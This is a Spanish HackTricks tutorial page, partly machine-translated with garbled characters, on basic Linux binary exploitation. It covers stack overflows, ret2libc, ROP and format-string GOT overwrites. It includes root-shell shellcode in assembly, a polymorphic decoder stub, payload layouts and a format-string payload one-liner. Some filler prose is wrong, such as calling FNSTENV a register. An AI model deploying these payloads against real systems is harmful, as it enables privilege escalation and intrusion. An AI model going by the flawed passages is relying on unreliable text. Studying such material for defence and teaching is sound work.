# Linux Exploiting (B√°sico)

## Linux Exploiting (B√°sico)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **ASLR**

Aleatorizaci√≥n de direcciones

**Desactivar aleatorizaci√≥n (ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivar aleatorizaci√≥n GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desactivar para una ejecuci√≥n** (no requiere root):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**Desactivar protecci√≥n de ejecuci√≥n en pila**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**Secci√≥n BSS**: Variables globales o est√°ticas sin inicializar
```
static int i;
```
**Secci√≥n DATA**: Variables globales o est√°ticas inicializadas

En esta secci√≥n, discutiremos sobre las variables globales o est√°ticas inicializadas en el contexto de la explotaci√≥n de Linux.

Cuando se compila un programa en Linux, se asigna un √°rea de memoria llamada secci√≥n DATA para almacenar variables globales y est√°ticas inicializadas. Estas variables se inicializan con valores espec√≠ficos antes de que el programa se ejecute.

Las variables globales son aquellas que se declaran fuera de cualquier funci√≥n y est√°n disponibles en todo el programa. Por otro lado, las variables est√°ticas son aquellas que se declaran dentro de una funci√≥n pero conservan su valor entre llamadas a la funci√≥n.

Estas variables pueden ser explotadas en el contexto de la explotaci√≥n de Linux para lograr ejecuci√≥n de c√≥digo arbitrario o para obtener informaci√≥n sensible. Por ejemplo, si una variable global almacena una contrase√±a o una clave de cifrado, un atacante podr√≠a intentar filtrar esta informaci√≥n mediante una vulnerabilidad de desbordamiento de b√∫fer.

Es importante tener en cuenta que la explotaci√≥n de variables globales o est√°ticas inicializadas requiere un conocimiento profundo de la estructura de memoria del programa y de las t√©cnicas de explotaci√≥n espec√≠ficas. Adem√°s, es fundamental comprender las implicaciones legales y √©ticas de cualquier actividad de hacking.
```
int i = 5;
```
## **1. DESBORDAMIENTO DE PILA**

> desbordamiento de b√∫fer, desbordamiento de pila, desbordamiento de pila, aplastamiento de pila

Violaci√≥n de segmento: cuando se intenta acceder a una direcci√≥n de memoria que no ha sido asignada al proceso.

Para obtener la direcci√≥n de una funci√≥n dentro de un programa, se puede hacer lo siguiente:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### Llamada a sys\_execve

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep "\_\_NR\_"

setreuid(0,0); // \_\_NR\_setreuid 70\
execve("/bin/sh", args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 since there are no arguments to pass\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** ‚Äî> Returns a .o file\
**ld assembly.o -o shellcodeout** ‚Äî> Gives us an executable formed by the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Para confirmar que las llamadas al sistema se realizan correctamente, debes compilar el programa anterior y verificar las llamadas del sistema utilizando **strace ./PROGRAMA_COMPILADO**.

Cuando se trata de crear shellcodes, puedes utilizar un truco. La primera instrucci√≥n es un salto a una llamada. La llamada ejecuta el c√≥digo original y tambi√©n coloca el EIP en la pila. Despu√©s de la instrucci√≥n de llamada, hemos insertado la cadena que necesitamos, por lo que con ese EIP podemos apuntar a la cadena y continuar ejecutando el c√≥digo.

EJ **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**Exploiting b√°sico de Linux - Ejecuci√≥n de c√≥digo usando el Stack (/bin/sh):**

En este ejercicio, aprenderemos c√≥mo explotar una vulnerabilidad de desbordamiento de b√∫fer en un programa de Linux para ejecutar nuestro propio c√≥digo. Utilizaremos el shell de sistema (/bin/sh) como ejemplo.

El objetivo de este ejercicio es obtener una shell interactiva en el sistema objetivo. Para lograr esto, necesitaremos encontrar una vulnerabilidad de desbordamiento de b√∫fer en el programa objetivo y aprovecharla para sobrescribir la direcci√≥n de retorno de la pila con la direcci√≥n de la funci√≥n `system()` y el argumento `/bin/sh`.

El programa objetivo es un binario de Linux que toma una entrada del usuario y la copia en un b√∫fer sin realizar ninguna verificaci√≥n de l√≠mites. Esto nos permite sobrescribir la direcci√≥n de retorno de la pila y controlar la ejecuci√≥n del programa.

Para explotar esta vulnerabilidad, necesitaremos encontrar la direcci√≥n de la funci√≥n `system()` y la cadena `/bin/sh` en la memoria del programa. Podemos hacer esto utilizando t√©cnicas de ingenier√≠a inversa o mediante el uso de herramientas como `gdb`.

Una vez que tengamos estas direcciones, podemos construir nuestro payload para sobrescribir la direcci√≥n de retorno de la pila con la direcci√≥n de `system()` y el argumento `/bin/sh`. Al ejecutar el programa objetivo con nuestro payload, se llamar√° a la funci√≥n `system()` con `/bin/sh` como argumento, lo que nos dar√° una shell interactiva en el sistema objetivo.

Recuerda que este ejercicio es solo con fines educativos y debe realizarse en un entorno controlado y con el permiso del propietario del sistema. El uso indebido de estas t√©cnicas puede ser ilegal y est√° sujeto a sanciones legales.
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**

El registro FNSTENV es un registro de control utilizado en la arquitectura x86 para almacenar el estado del punto flotante y los registros de control. Este registro es importante en el contexto de la explotaci√≥n de vulnerabilidades en sistemas Linux.

Cuando se explota una vulnerabilidad en un programa, a menudo se busca ejecutar c√≥digo arbitrario en el sistema objetivo. Sin embargo, para lograr esto, es necesario controlar el flujo de ejecuci√≥n del programa y redirigirlo a nuestro c√≥digo malicioso.

Una t√©cnica com√∫nmente utilizada para lograr esto es la explotaci√≥n de desbordamientos de b√∫fer. En este tipo de vulnerabilidad, se permite que se escriba m√°s all√° de los l√≠mites de un b√∫fer, lo que puede llevar a la corrupci√≥n de datos y a la ejecuci√≥n de c√≥digo arbitrario.

En el caso de la explotaci√≥n de desbordamientos de b√∫fer en sistemas Linux, a menudo se utiliza el registro FNSTENV para lograr el control del flujo de ejecuci√≥n. Este registro almacena el estado del punto flotante y los registros de control, incluyendo el puntero de instrucci√≥n (EIP) que indica la pr√≥xima instrucci√≥n a ejecutar.

Al sobrescribir el contenido del registro FNSTENV con una direcci√≥n de memoria controlada por el atacante, es posible redirigir el flujo de ejecuci√≥n del programa a nuestro c√≥digo malicioso. Esto nos permite ejecutar instrucciones arbitrarias y tomar el control del sistema objetivo.

Es importante destacar que la explotaci√≥n de desbordamientos de b√∫fer y el uso del registro FNSTENV para controlar el flujo de ejecuci√≥n son t√©cnicas avanzadas y requieren un profundo conocimiento de la arquitectura x86 y de la programaci√≥n de sistemas. Estas t√©cnicas se utilizan com√∫nmente en el contexto de la seguridad inform√°tica y las pruebas de penetraci√≥n para identificar y corregir vulnerabilidades en sistemas Linux.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Egg Hunter:**

Este es un peque√±o c√≥digo que busca la shellcode almacenada en las p√°ginas de memoria asociadas a un proceso (busca una firma espec√≠fica en la shellcode). Es √∫til cuando solo se dispone de un espacio reducido para inyectar c√≥digo.

**Shellcodes polim√≥rficos**

Estos son shells cifrados que contienen un peque√±o c√≥digo para descifrarlos y saltar a √©l, utilizando el truco de Call-Pop. Aqu√≠ hay un **ejemplo de cifrado C√©sar**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
1. **Attacking the Frame Pointer (EBP)**

Useful in a situation where we can modify the EBP but not the EIP.

It is known that when exiting a function, the following assembly code is executed:
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta manera, es posible modificar el EBP al salir de una funci√≥n (fvuln) que ha sido llamada por otra funci√≥n, lo que permite modificar el EIP al finalizar la funci√≥n que llam√≥ a fvuln.

En fvuln, se puede introducir un EBP falso que apunte a una ubicaci√≥n donde se encuentre la direcci√≥n de la shellcode + 4 (se suma 4 por el pop). De esta manera, al salir de la funci√≥n, el valor de &(\&Shellcode)+4 se colocar√° en ESP, y con el pop se restar√° 4 a ESP, apuntando as√≠ a la direcci√≥n de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Exploit Off-by-One:**\
Solo se puede modificar el byte menos significativo del EBP. Se puede realizar un ataque similar al anterior, pero la memoria que almacena la direcci√≥n de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. M√©todos return to Libc**

Este m√©todo es √∫til cuando el stack no es ejecutable o cuando hay un buffer muy peque√±o para modificar.

El ASLR hace que en cada ejecuci√≥n las funciones se carguen en diferentes posiciones de la memoria. Por lo tanto, este m√©todo puede no ser efectivo en ese caso. Sin embargo, para servidores remotos, donde el programa se ejecuta constantemente en la misma direcci√≥n, puede ser √∫til.

* **cdecl (C declaration):** Coloca los argumentos en el stack y limpia la pila despu√©s de salir de la funci√≥n.
* **stdcall (standard call):** Coloca los argumentos en el stack y es la funci√≥n llamada la que limpia la pila.
* **fastcall:** Coloca los dos primeros argumentos en registros y el resto en el stack.

Se coloca la direcci√≥n de la instrucci√≥n system de libc y se pasa como argumento el string "/bin/sh", generalmente desde una variable de entorno. Adem√°s, se utiliza la direcci√≥n de la funci√≥n exit para que, una vez que no se necesite m√°s la shell, el programa salga sin problemas (y sin escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos, podemos mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** ‚Äî> Muestra la direcci√≥n de todas las funciones utilizadas por el programa al cargarse\
(Dentro de un start o alg√∫n breakpoint): **x/500s $esp** ‚Äî> Buscamos aqu√≠ el string /bin/sh

Una vez que tengamos estas direcciones, el **exploit** quedar√≠a as√≠:

"A" \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s, aunque es mejor si es el EBP real para evitar fallos de segmentaci√≥n) + Direcci√≥n de **system** (sobrescribir√° el EIP) + Direcci√≥n de **exit** (al salir de system("/bin/sh"), se llamar√° a esta funci√≥n, ya que los primeros 4 bytes del stack se tratan como la siguiente direcci√≥n del EIP a ejecutar) + Direcci√≥n de "/bin/sh" (ser√° el par√°metro pasado a system)

De esta manera, el EIP se sobrescribir√° con la direcci√≥n de system, que recibir√° como par√°metro el string "/bin/sh", y al salir de esta funci√≥n se ejecutar√° la funci√≥n exit().

Es posible encontrarse en la situaci√≥n de que alg√∫n byte de alguna direcci√≥n de alguna funci√≥n sea nulo o espacio (\x20). En ese caso, se pueden desensamblar las direcciones anteriores a dicha funci√≥n, ya que probablemente haya varios NOPs que nos permitan llamar a alguno de ellos en lugar de llamar directamente a la funci√≥n (por ejemplo, con > x/8i system-4).

Este m√©todo funciona porque al llamar a una funci√≥n como system usando el opcode **ret** en lugar de **call**, la funci√≥n entiende que los primeros 4 bytes ser√°n la direcci√≥n **EIP** a la que volver.

Una t√©cnica interesante con este m√©todo es llamar a **strncpy()** para mover un payload del stack al heap y luego usar **gets()** para ejecutar dicho payload.

Otra t√©cnica interesante es el uso de **mprotect()**, que permite asignar los permisos deseados a cualquier parte de la memoria. Funciona o funcionaba en BDS, MacOS y OpenBSD, pero no en Linux (controla que no se puedan otorgar permisos de escritura y ejecuci√≥n al mismo tiempo). Con este ataque, se podr√≠a volver a configurar el stack como ejecutable.

**Encadenamiento de funciones**

Bas√°ndonos en la t√©cnica anterior, esta forma de exploit consiste en:\
Relleno + \&Funci√≥n1 + \&pop;ret; + \&arg\_fun1 + \&Funci√≥n2 + \&pop;ret; + \&arg\_fun2 + ...

De esta manera, se pueden encadenar funciones a las que llamar. Adem√°s, si se desean utilizar funciones con varios argumentos, se pueden colocar los argumentos necesarios (por ejemplo, 4) y buscar una direcci√≥n con opcodes: pop, pop, pop, pop, ret ‚Äî> **objdump -d ejecutable**

**Encadenamiento mediante falsificaci√≥n de frames (encadenamiento de EBPs)**

Consiste en aprovechar la capacidad de manipular el EBP para encadenar la ejecuci√≥n de varias funciones a trav√©s del EBP y de "leave;ret".

RELLENO

* Se coloca un EBP falso en el EBP que apunta a: 2¬∫ EBP\_falso + la funci√≥n a ejecutar: (\&system() + \&leave;ret + &"/bin/sh")
* En el EIP se coloca la direcci√≥n de una funci√≥n &(leave;ret)

Se inicia la shellcode con la direcci√≥n de la siguiente parte de la shellcode, por ejemplo: 2¬∫EBP\_falso + \&system() + &(leave;ret;) + &"/bin/sh"

El 2¬∫EBP ser√≠a: 3¬∫EBP\_falso + \&system() + &(leave;ret;) + &"/bin/ls"

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso, de manera que se obtendr√° una shellcode f√°cilmente divisible en peque√±os trozos de memoria.

(Se encadena la ejecuci√≥n de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)
## **5. M√©todos complementarios**

**Ret2Ret**

Este m√©todo es √∫til cuando no se puede insertar una direcci√≥n del stack en el EIP (se verifica que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicaci√≥n de la shellcode. Sin embargo, la funci√≥n vulnerable acepta un par√°metro (aqu√≠ se colocar√° la shellcode).

De esta manera, al cambiar el EIP por una direcci√≥n de **ret**, se cargar√° la siguiente direcci√≥n (que es la direcci√≥n del primer argumento de la funci√≥n). Es decir, se cargar√° la shellcode.

El exploit quedar√≠a as√≠: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode, ya que se coloca en el stack la direcci√≥n del par√°metro pasado).

Al parecer, funciones como **strncpy** eliminan la direcci√≥n donde se guardaba la shellcode de la pila una vez que se completan, lo que imposibilita esta t√©cnica. Es decir, la direcci√≥n que se pasa a la funci√≥n como argumento (la que guarda la shellcode) se modifica por un 0x00, por lo que al llamar al segundo **ret**, se encuentra con un 0x00 y el programa se detiene.
```
**Ret2PopRet**
```
Si no tenemos control sobre el primer argumento pero s√≠ sobre el segundo o el tercero, podemos sobreescribir EIP con una direcci√≥n a pop-ret o pop-pop-ret, seg√∫n la que necesitemos.

**T√©cnica de Murat**

En Linux, todos los programas se mapean comenzando en 0xbfffffff.

Viendo c√≥mo se construye la pila de un nuevo proceso en Linux, se puede desarrollar un exploit de forma que el programa sea arrancado en un entorno cuya √∫nica variable sea la shellcode. La direcci√≥n de esta entonces se puede calcular como: addr = 0xbfffffff - 4 - strlen(NOMBRE_ejecutable_completo) - strlen(shellcode)

De esta forma se obtendr√≠a de forma sencilla la direcci√≥n donde est√° la variable de entorno con la shellcode.

Esto se puede hacer gracias a que la funci√≥n execle permite crear un entorno que solo tenga las variables de entorno que se deseen.

**Jump to ESP: Windows Style**

Debido a que el ESP est√° apuntando al comienzo del stack siempre, esta t√©cnica consiste en sustituir el EIP con la direcci√≥n a una llamada a **jmp esp** o **call esp**. De esta forma, se guarda la shellcode despu√©s de la sobreescritura del EIP ya que despu√©s de ejecutar el **ret** el ESP se encontrar√° apuntando a la direcci√≥n siguiente, justo donde se ha guardado la shellcode.

En caso de que no se tenga el ASLR activo en Windows o Linux se puede llamar a **jmp esp** o **call esp** almacenadas en alg√∫n objeto compartido. En caso de que est√© el ASLR, se podr√≠a buscar dentro del propio programa vulnerable.

Adem√°s, el hecho de poder colocar la shellcode despu√©s de la corrupci√≥n del EIP en vez de en medio del stack, permite que las instrucciones push o pop que se ejecuten en medio de la funci√≥n no lleguen a tocar la shellcode (cosa que podr√≠a ocurrir en caso de ponerse en medio del stack de la funci√≥n).

De forma muy similar a esto si sabemos que una funci√≥n devuelve la direcci√≥n donde est√° guardada la shellcode se puede llamar a **call eax** o **jmp eax (ret2eax).**

**ROP (Return Oriented Programming) o borrowed code chunks**

Los trozos de c√≥digo que se invocan se conocen como gadgets.

Esta t√©cnica consiste en encadenar distintas llamadas a funciones mediante la t√©cnica de **ret2libc** y el uso de **pop,ret**.

En algunas arquitecturas de procesadores cada instrucci√≥n es un conjunto de 32bits (MIPS por ej). Sin embargo, en Intel las instrucciones son de tama√±o variable y varias instrucciones pueden compartir un conjunto de bits, por ejemplo:

**movl $0xe4ff, -0x(%ebp)** ‚Äî> Contiene los bytes 0xffe4 que tambi√©n se traducen por: **jmp \*%esp**

De esta forma se pueden ejecutar algunas instrucciones que realmente ni siquiera est√°n en el programa original.

**ROPgadget.py** nos ayuda a encontrar valores en binarios.

Este programa tambi√©n sirve para crear los **payloads**. Le puedes dar la librer√≠a de la que quieres sacar los ROPs y √©l generar√° un payload en python al cual t√∫ le das la direcci√≥n en la que est√° dicha librer√≠a y el payload ya est√° listo para ser usado como shellcode. Adem√°s, como usa llamadas al sistema no ejecuta realmente nada en el stack sino que solo va guardando direcciones de ROPs que se ejecutar√°n mediante **ret**. Para usar este payload hay que llamar al payload mediante una instrucci√≥n **ret**.

**Integer overflows**

Este tipo de overflows se producen cuando una variable no est√° preparada para soportar un n√∫mero tan grande como se le pasa, posiblemente por una confusi√≥n entre variables con y sin signo, por ejemplo:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
En el ejemplo anterior, vemos que el programa espera 2 par√°metros. El primero es la longitud de la cadena siguiente y el segundo es la cadena en s√≠.

Si pasamos un n√∫mero negativo como primer par√°metro, se cumplir√° la condici√≥n len < 256 y se pasar√° ese filtro. Adem√°s, strlen(buffer) ser√° menor que l, ya que l es un unsigned int y ser√° muy grande.

Este tipo de desbordamientos no busca escribir algo en el proceso del programa, sino superar filtros mal dise√±ados para explotar otras vulnerabilidades.

**Variables no inicializadas**

No se conoce el valor que puede tomar una variable no inicializada y podr√≠a ser interesante observarlo. Es posible que tome el valor que ten√≠a una variable de la funci√≥n anterior y que esta sea controlada por el atacante.

## **Format Strings**

En C, **`printf`** es una funci√≥n que se puede utilizar para **imprimir** una cadena. El **primer par√°metro** que espera esta funci√≥n es el **texto sin formato con los formateadores**. Los **par√°metros siguientes** esperados son los **valores** que se **sustituir√°n** en los **formateadores** del texto sin formato.

La vulnerabilidad aparece cuando un **texto del atacante se coloca como primer argumento** en esta funci√≥n. El atacante podr√° crear una **entrada especial abusando de las capacidades de formato** de la cadena de formato de **printf** para **escribir cualquier dato en cualquier direcci√≥n**. De esta manera, podr√° **ejecutar c√≥digo arbitrario**.

Formateadores:
```bash
%08x ‚Äî> 8 hex bytes
%d ‚Äî> Entire
%u ‚Äî> Unsigned
%s ‚Äî> String
%n ‚Äî> Number of written bytes
%hn ‚Äî> Occupies 2 bytes instead of 4
<n>$X ‚Äî> Direct access, Example: ("%3$d", var1, var2, var3) ‚Äî> Access to var3
```
**`%n`** **escribe** el **n√∫mero de bytes escritos** en la **direcci√≥n indicada**. Escribir** tantos bytes** como el n√∫mero hexadecimal que **necesitamos** escribir es c√≥mo podemos **escribir cualquier dato**.
```bash
AAAA%.6000d%4\$n ‚Äî> Write 6004 in the address indicated by the 4¬∫ param
AAAA.%500\$08x ‚Äî> Param at offset 500
```
### GOT (Tabla de Desplazamientos Globales) / PLT (Tabla de Enlace de Procedimientos)

Esta es la tabla que contiene la **direcci√≥n** de las **funciones externas** utilizadas por el programa.

Obt√©n la direcci√≥n de esta tabla con: **`objdump -s -j .got ./exec`**

![](<../../.gitbook/assets/image (619).png>)

Observa c√≥mo despu√©s de **cargar** el **ejecutable** en GEF puedes **ver** las **funciones** que est√°n en el **GOT**: `gef‚û§ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

Usando GEF puedes **iniciar** una **sesi√≥n de depuraci√≥n** y ejecutar **`got`** para ver la tabla got:

![](<../../.gitbook/assets/image (621).png>)

En un binario, el GOT tiene las **direcciones de las funciones o** de la **secci√≥n PLT** que cargar√° la direcci√≥n de la funci√≥n. El objetivo de esta explotaci√≥n es **sobrescribir la entrada GOT** de una funci√≥n que se ejecutar√° m√°s adelante **con** la **direcci√≥n** de la PLT de la **funci√≥n `system`**. Idealmente, se **sobrescribir√°** el **GOT** de una **funci√≥n** que se **llamar√° con par√°metros controlados por ti** (as√≠ podr√°s controlar los par√°metros enviados a la funci√≥n del sistema).

Si **`system`** **no se utiliza** en el script, la funci√≥n del sistema **no tendr√° una entrada en el GOT**. En este escenario, necesitar√°s **filtrar primero la direcci√≥n** de la funci√≥n `system`.

La **Tabla de Enlace de Procedimientos** es una tabla de solo lectura en el archivo ELF que almacena todos los **s√≠mbolos necesarios que necesitan una resoluci√≥n**. Cuando se llama a una de estas funciones, el **GOT** redirigir√° el **flujo** a la **PLT** para que pueda **resolver** la **direcci√≥n** de la funci√≥n y escribirla en el GOT.\
Luego, la **pr√≥xima vez** que se realice una llamada a esa direcci√≥n, la **funci√≥n** se **llamar√° directamente** sin necesidad de resolverla.

Puedes ver las direcciones de la PLT con **`objdump -j .plt -d ./vuln_binary`**

### **Flujo de Explotaci√≥n**

Como se explic√≥ anteriormente, el objetivo ser√° **sobrescribir** la **direcci√≥n** de una **funci√≥n** en la tabla **GOT** que se llamar√° m√°s adelante. Idealmente, podr√≠amos establecer la **direcci√≥n de un shellcode** ubicado en una secci√≥n ejecutable, pero es muy probable que no puedas escribir un shellcode en una secci√≥n ejecutable.\
Entonces, una opci√≥n diferente es **sobrescribir** una **funci√≥n** que **reciba** sus **argumentos** del **usuario** y **apuntarla** a la **funci√≥n `system`**.

Para escribir la direcci√≥n, generalmente se realizan 2 pasos: **primero se escriben 2 bytes** de la direcci√≥n y luego los otros 2. Para hacerlo se utiliza **`$hn`**.

**HOB** se refiere a los 2 bytes m√°s altos de la direcci√≥n\
**LOB** se refiere a los 2 bytes m√°s bajos de la direcci√≥n

Entonces, debido a c√≥mo funciona el formato de cadena, debes **escribir primero el m√°s peque√±o** de \[HOB, LOB] y luego el otro.

Si HOB < LOB\
`[direcci√≥n+2][direcci√≥n]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Si HOB > LOB\
`[direcci√≥n+2][direcci√≥n]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 N¬∫Param\_dir\_HOB LOB\_shell-HOB\_shell N¬∫Param\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Plantilla de Explotaci√≥n de Formato de Cadena**

Puedes encontrar una **plantilla** para explotar el GOT utilizando format-strings aqu√≠:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini\_array**

B√°sicamente, esta es una estructura con **funciones que se llamar√°n** antes de que el programa finalice. Esto es interesante si puedes llamar a tu **shellcode saltando a una direcci√≥n**, o en casos en los que necesites volver a main nuevamente para **explotar la cadena de formato una segunda vez**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Ten en cuenta que esto **no crear√°** un **bucle eterno** porque cuando regreses a la funci√≥n principal, el canario se dar√° cuenta, el final de la pila podr√≠a estar corrompido y la funci√≥n no se volver√° a llamar. Por lo tanto, con esto podr√°s **tener una ejecuci√≥n adicional** de la vulnerabilidad.

### **Format Strings para volcar contenido**

Una cadena de formato tambi√©n puede ser abusada para **volcar contenido** de la memoria del programa.\
Por ejemplo, en la siguiente situaci√≥n hay una **variable local en la pila que apunta a una bandera**. Si **encuentras** en qu√© **direcci√≥n de memoria** se encuentra el **puntero** a la **bandera**, puedes hacer que **printf acceda** a esa **direcci√≥n** e **imprima** la **bandera**:

Entonces, la bandera est√° en **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Y a partir de la fuga puedes ver que el **puntero a la bandera** est√° en el **8vo** par√°metro:

![](<../../.gitbook/assets/image (623).png>)

Entonces, **accediendo** al **8vo par√°metro** puedes obtener la bandera:

![](<../../.gitbook/assets/image (624).png>)

Ten en cuenta que siguiendo el **exploit anterior** y d√°ndote cuenta de que puedes **filtrar contenido**, puedes **establecer punteros** a **`printf`** en la secci√≥n donde se **carga** el **ejecutable** y **volcarlo** por **completo**.

### **DTOR**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro encontrar un binario con una secci√≥n dtor**.
{% endhint %}

Los destructores son funciones que se **ejecutan antes de que el programa termine**.\
Si logras **escribir** una **direcci√≥n** a un **shellcode** en **`__DTOR_END__`**, eso se **ejecutar√°** antes de que el programa termine.\
Obt√©n la direcci√≥n de esta secci√≥n con:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
